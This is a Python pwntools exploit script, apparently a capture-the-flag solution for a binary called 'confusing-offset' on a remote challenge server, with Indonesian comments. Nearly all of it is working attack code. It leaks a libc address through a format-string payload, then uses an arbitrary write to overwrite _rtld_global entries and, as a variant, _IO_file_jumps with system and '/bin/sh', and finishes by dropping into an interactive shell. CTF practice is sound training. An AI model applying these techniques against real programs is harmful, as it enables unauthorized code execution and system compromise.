from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'confusing-offset'
elf = ELF(program,checksec=False)
lokal = True
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    libc = elf.libc
    # libc = ELF("./libc.so.6",checksec=False)
    libc = ELF("./libc.so.6",checksec=False)
else:
    host = 'chall.codepwnda.id'
    port = '17022'
    xp = remote(host,port)
    libc = ELF("./libc.so.6",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *_dl_fini+378 \n c"
    gdb.attach(xp,cmd)

#Exploit Here
def write(a,b):
	sla("> ","1")
	sla("A: ",str(a))
	sla("B: ",str(b))


p = "%17$p"
sla("name? ",p)
ru("Hello ")
leak = int(xp.recvline()[:-1],16)
# print hex(leak)

libc.address = leak - 0x270b3
system = libc.symbols['system']
bin_sh = libc.search('/bin/sh').next()


# versi _dl_fini
rdi = libc.address+0x255968 #local
ptr = libc.address+0x255f70 #local
# rdi = libc.address+0x224968 #remote
# ptr = libc.address+0x224f68 #remote
log.info("Libc Base = " + hex(libc.address))

# 0x7fe998285968 <_rtld_global+2312>:	0x00000000 rdi
# 0x7fe998285f60 <_rtld_global+3848>:	0x00000000 ptr
# rltd_global+3848 akan terpanggil saat exit
write(ptr,system)

# rltd_global+2312 sebagai rdi
write(rdi,u64("/bin/sh\x00"))
sl("2")

# versi FSOP
# stdin = libc.symbols['_IO_2_1_stdin_']
# print hex(stdin)
write(libc.symbols['_IO_file_jumps']+(8*3),system)
write(libc.symbols['_IO_2_1_stdout_'],uu64("/bin/sh"))


xp.interactive()
